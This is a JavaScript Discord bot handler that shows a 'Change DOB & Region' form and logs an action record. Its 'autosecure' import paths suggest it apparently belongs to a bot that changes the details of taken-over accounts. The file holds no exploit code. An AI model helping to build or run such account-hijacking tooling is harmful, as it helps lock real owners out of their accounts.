const { TextInputStyle } = require("discord.js");
const generate = require("../../../autosecure/utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");

module.exports = {
    name: "changedob",
    callback: async (client, interaction) => {
        // console.log(`[changedob] interaction received with customId: ${interaction.customId}`);

        const parts = interaction.customId.split('|');
        const isSecure = parts[1] === "true";
        const hasAction = parts.length > 2;

        let customModalId;

        if (hasAction) {
            const actionId = generate(32);
            // console.log(`[changedob] Inserting action into DB with id: ${actionId}, action: changedob|${parts[1]}|${parts[2]}`);
            try {
                await client.queryParams(
                    `INSERT INTO actions (id, action) VALUES (?, ?)`,
                    [actionId, `changedob|${parts[1]}|${parts[2]}`]
                );
                // console.log(`[changedob] Action inserted successfully.`);
            } catch (err) {
                // console.error(`[changedob] Error inserting action:`, err);
            }
            customModalId = `action|${actionId}`;
        } else {
            customModalId = isSecure ? `changedob|true` : `changedob`;
            // console.log(`[changedob] No action insertion needed. Using modal customId: ${customModalId}`);
        }

        // console.log(`[changedob] Showing modal with customId: ${customModalId}`);
        interaction.showModal(modalBuilder(
            customModalId,
            `Change DOB & Region`,
            [
                {
                    setCustomId: 'day',
                    setMaxLength: 2,
                    setRequired: false,
                    setLabel: "DD",
                    setPlaceholder: "Day (1-30)",
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'month',
                    setMaxLength: 2,
                    setRequired: false,
                    setLabel: "MM",
                    setPlaceholder: "Month (1-12)",
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'year',
                    setMaxLength: 4,
                    setRequired: false,
                    setLabel: "YYYY",
                    setPlaceholder: "Year (1933-2007)",
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'country',
                    setRequired: false,
                    setLabel: "Country name or ISO (2 or 3) code",
                    setPlaceholder: "e.g. United States or US",
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
